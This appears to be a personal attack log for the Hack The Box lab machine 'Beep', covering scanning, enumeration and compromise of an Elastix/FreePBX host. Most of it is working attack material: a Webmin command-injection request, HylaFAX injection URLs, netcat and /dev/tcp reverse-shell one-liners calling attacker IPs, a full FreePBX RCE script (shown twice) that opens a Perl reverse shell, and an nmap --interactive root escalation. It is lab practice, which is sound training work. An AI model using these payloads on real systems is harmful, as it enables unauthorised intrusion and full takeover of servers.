
```
6:49 PM 1/28/2023
┌──(root㉿kali)-[/home/kali]
└─# ping 10.10.10.7  
PING 10.10.10.7 (10.10.10.7) 56(84) bytes of data.
64 bytes from 10.10.10.7: icmp_seq=1 ttl=63 time=120 ms
```

```
6:50 PM 1/28/2023													# finished at 7:09 PM 1/28/2023

nmap -Pn -sV -sC -p- -oN full 10.10.10.7
			PORT      STATE SERVICE    VERSION
			22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
			| ssh-hostkey: 
			|   1024 adee5abb6937fb27afb83072a0f96f53 (DSA)
			|_  2048 bcc6735913a18a4b550750f6651d6d0d (RSA)
			25/tcp    open  smtp       Postfix smtpd
			|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
			80/tcp    open  http       Apache httpd 2.2.3																							# going here 1st - 		unaccessible
			|_http-title: Did not follow redirect to https://10.10.10.7/
			|_http-server-header: Apache/2.2.3 (CentOS)
			110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
			|_pop3-capabilities: LOGIN-DELAY(0) APOP RESP-CODES STLS USER TOP AUTH-RESP-CODE IMPLEMENTATION(Cyrus POP3 server v2) UIDL EXPIRE(NEVER) PIPELINING
			111/tcp   open  rpcbind    2 (RPC #100000)
			| rpcinfo: 
			|   program version    port/proto  service
			|   100000  2            111/tcp   rpcbind
			|   100000  2            111/udp   rpcbind
			|   100024  1            876/udp   status
			|_  100024  1            879/tcp   status
			143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
			|_imap-capabilities: STARTTLS LIST-SUBSCRIBED Completed RENAME UIDPLUS OK CATENATE SORT=MODSEQ LISTEXT ATOMIC URLAUTHA0001 CONDSTORE X-NETSCAPE RIGHTS=kxte ANNOTATEMORE IDLE THREAD=ORDEREDSUBJECT IMAP4 IMAP4rev1 ACL SORT ID BINARY NO MULTIAPPEND MAILBOX-REFERRALS LITERAL+ THREAD=REFERENCES CHILDREN NAMESPACE QUOTA UNSELECT
			443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))																				# here 2nd				- unaccessible
			| http-robots.txt: 1 disallowed entry 
			|_/
			|_http-server-header: Apache/2.2.3 (CentOS)
			| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
			| Not valid before: 2017-04-07T08:22:08
			|_Not valid after:  2018-04-07T08:22:08
			|_ssl-date: 2023-01-29T06:05:07+00:00; +59m59s from scanner time.
			|_http-title: Elastix - Login page
			879/tcp   open  status     1 (RPC #100024)
			993/tcp   open  ssl/imap   Cyrus imapd
			|_imap-capabilities: CAPABILITY
			995/tcp   open  pop3       Cyrus pop3d
			3306/tcp  open  mysql      MySQL (unauthorized)																							# potential mysql
			4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
			4445/tcp  open  upnotifyp?
			4559/tcp  open  hylafax    HylaFAX 4.3.10																								# https://www.exploit-db.com/exploits/20462
			5038/tcp  open  asterisk   Asterisk Call Manager 1.1
			10000/tcp open  http       MiniServ 1.570 (Webmin httpd)																				# miniserver here 3rd
			|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
			Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix

			Host script results:
			|_clock-skew: 59m58s

			Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
			Nmap done: 1 IP address (1 host up) scanned in 1084.72 seconds
                                                                                
```

```
7:12 PM 1/28/2023																												# probably not cyrus
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/beep]
└─# searchsploit cyrus                                                                                                
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cyrus IMAPD - pop3d popsubfolders USER Buffer Overflow (Metasploit)                                                                                                                                        | linux/remote/16836.rb
Cyrus IMAPD 1.4/1.5.19/2.0.12/2.0.16/2.1.9/2.1.10 - Pre-Login Heap Corruption                                                                                                                              | linux/dos/22061.txt
Cyrus imapd 2.2.4 < 2.2.8 - 'imapmagicplus' Remote Overflow                                                                                                                                                | linux/remote/903.c
Cyrus IMAPD 2.3.2 - 'pop3d' Remote Buffer Overflow (1)                                                                                                                                                     | linux/remote/1813.c
Cyrus IMAPD 2.3.2 - 'pop3d' Remote Buffer Overflow (2)                                                                                                                                                     | multiple/remote/2053.rb
Cyrus IMAPD 2.3.2 - 'pop3d' Remote Buffer Overflow (3)                                                                                                                                                     | linux/remote/2185.pl
Cyrus IMSP Daemon 1.x - Remote Buffer Overflow                                                                                                                                                             | linux/remote/23441.c
Cyrus IMSPD 1.7 - 'abook_dbname' Remote Code Execution                                                                                                                                                     | linux/remote/139.c
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

```

7:21 PM 1/28/2023
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/beep]
└─# searchsploit 2.2.3 apache

Apache < 1.3.37/2.0.59/2.2.3 mod_rewrite - Remote Overflow                                                                                                                                                 | multiple/remote/2237.sh
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                                                                                                                                                           | linux/webapps/42745.py
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                                                                                                            | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                                                                                                          | php/remote/29316.py

```

```

7:27 PM 1/28/2023	# webmin poc																						# did not work.
https://github.com/jas502n/CVE-2019-15107														

POST /password_change.cgi HTTP/1.1
Host: 10.10.10.7:10000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Cookie: redirect=1; testing=1; sid=x; sessiontest=1
Referer: https://10.10.10.7:10000/session_login.cgi
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2



<div class="panel-body">
<hr>
<center><h3>Failed to change password : The current password is incorrectuid=0(root) gid=0(root) groups=0(root)
</h3></center>


7:34 PM 1/28/2023																							# trying to exploit hylafax
https://www.exploit-db.com/exploits/20462


http://10.10.10.7:4559/cgi-bin/faxsurvey?/bin/cat%20/etc/passwd 											# its thinking, going to try to get a reverse shell this way.


http://10.10.10.7:4559/cgi-bin/faxsurvey?nc%20-e%/bin/sh%2010.13.13.125%201234
http://10.10.10.7:4559/cgi-bin/faxsurvey?/bin/sh%20nc%2010.13.13.125%201234

nc 172.16.1.100 1234 -e /bin/sh

nc -e /bin/sh ATTACKING-IP 80

# Picking up tomorrow, burnt out.

```

```

3:33 PM 1/30/2023
Starting again

3:35 PM 1/30/2023
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%22


3:45 PM 1/30/2023																							# msfcole asterisk cred dujmp didnt work.
msf6 > use auxiliary/gather/asterisk_creds
msf6 auxiliary(gather/asterisk_creds) > show targets
[-] No exploit module selected.
msf6 auxiliary(gather/asterisk_creds) > show options

Module options (auxiliary/gather/asterisk_creds):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  amp111           yes       The password for the specified username
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     5038             yes       The target port (TCP)
   USERNAME  admin            yes       The username for Asterisk Call Manager

msf6 auxiliary(gather/asterisk_creds) > set rhosts 10.10.10.7
rhosts => 10.10.10.7
msf6 auxiliary(gather/asterisk_creds) > run
[*] Running module against 10.10.10.7

[*] 10.10.10.7:5038 - Found Asterisk Call Manager version 1.1
[-] 10.10.10.7:5038 - Auxiliary aborted due to failure: no-access: Authentication failed
[*] Auxiliary module execution completed
msf6 auxiliary(gather/asterisk_creds) > 

```

```
3:51 PM 1/30/2023
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u http://10.10.10.7:80 -x 400,401,403


──(root㉿kali)-[/usr/share/wordlists/dirbuster]
└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.7 -k -t 50 -x php,txt,zip

/config.php           (Status: 200) [Size: 1785]
/robots.txt           (Status: 200) [Size: 28]																	# nothing here
/register.php         (Status: 200) [Size: 1785]
/index.php            (Status: 200) [Size: 1785]
```

```
4:14 PM 1/30/2023
https://10.10.10.7/config.php																elastix login page. - admin/admin and root/root do not work

```

```
4:17 PM 1/30/2023																#elastix/FreePBX remote code execution
https://www.exploit-db.com/exploits/18650
```

```
4:30 PM 1/30/2023																	
# downloaded sipvicious to confirm extension for code below
┌──(root㉿kali)-[/home/kali/Downloads]
└─# apt-get install sipvicious  


4:32 PM 1/30/2023				# confiremed 233 code
┌──(root㉿kali)-[/home/kali/Downloads]
└─# svwar -m INVITE -e100-300 10.10.10.7
WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
+-----------+----------------+
| Extension | Authentication |
+===========+================+
| 233       | reqauth        |
+-----------+----------------+

```

```
4:32 PM 1/30/2023
https://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution/blob/master/exploit.py							# exploit ripped off github.
#exploit modified by infosecjunky
#https://infosecjunky.com

import urllib2
import ssl

rhost="10.10.10.7"
lhost="10.10.16.4"
lport=4444
extension="233"


ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Reverse shell payload

url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

urllib2.urlopen(url,context=ctx)

# On Elastix, once we have a shell, we can escalate to root:
# root@bt:~# nc -lvp 443
# listening on [any] 443 ...
# connect to [172.16.254.223] from voip [172.16.254.72] 43415
# id
# uid=100(asterisk) gid=101(asterisk)
# sudo nmap --interactive

# Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
# Welcome to Interactive Mode -- press h <enter> for help
# nmap> !sh
# id
# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)

```

```

4:32 PM 1/30/2023																						# on box with no shell
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.7] 55938
whoami
asterisk

4:35 PM 1/30/2023																# now in a shell												
python -c 'import pty; pty.spawn("/bin/bash")'
	sh-3.2$ 
```

```

4:37 PM 1/30/2023
######################	Starting checks #############################

sh-3.2$ hostname
hostname
beep

sh-3.2$ cat /etc/passwd | cut -d : -f 1
cat /etc/passwd | cut -d : -f 1
root
bin
daemon
adm
lp
sync
shutdown
halt
mail
news
uucp
operator
games
gopher
ftp
nobody
mysql
distcache
vcsa
pcap
ntp
cyrus
dbus
apache
mailman
rpc
postfix
asterisk
rpcuser
nfsnobody
sshd
spamfilter
haldaemon
xfs
fanis

4:39 PM 1/30/2023
bash-3.2$ pwd
pwd
/tmp

```

```
4:40 PM 1/30/2023
bash-3.2$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/sperl5.8.8
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/at
/usr/bin/chage
/usr/bin/sudoedit
/usr/bin/chfn
/usr/bin/newgrp
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/libexec/mc/cons.saver
/usr/libexec/openssh/ssh-keysign
/usr/sbin/ccreds_validate
/usr/sbin/userhelper
/usr/sbin/suexec
/usr/sbin/usernetctl
/usr/kerberos/bin/ksu
/bin/mount
/bin/umount
/bin/su
/bin/ping
/bin/ping6
/lib/dbus-1/dbus-daemon-launch-helper
/sbin/pam_timestamp_check
/sbin/mount.nfs
/sbin/umount.nfs
/sbin/umount.nfs4
/sbin/mount.nfs4
/sbin/unix_chkpwd
bash-3.2$ 

```

```
4:48 PM 1/30/2023																																				# priv esc'd by just using bottom of the script.
#exploit modified by infosecjunky
#https://infosecjunky.com

import urllib2
import ssl

rhost="10.10.10.7"
lhost="10.10.14.4"
lport=4444
extension="233"


ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Reverse shell payload

url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

urllib2.urlopen(url,context=ctx)

# On Elastix, once we have a shell, we can escalate to root:
# root@bt:~# nc -lvp 443
# listening on [any] 443 ...
# connect to [172.16.254.223] from voip [172.16.254.72] 43415
# id
# uid=100(asterisk) gid=101(asterisk)
# sudo nmap --interactive

# Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
# Welcome to Interactive Mode -- press h <enter> for help
# nmap> !sh
# id
# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)

```

```
4:48 PM 1/30/2023
cat root.txt
2333d813e0be8c34364d8fcf01da33b5

# Simple box the main thing that hung me up is that firefox wouldnt let me just query for http, it forced me to do https which was an issue for attacking the webserver. 
```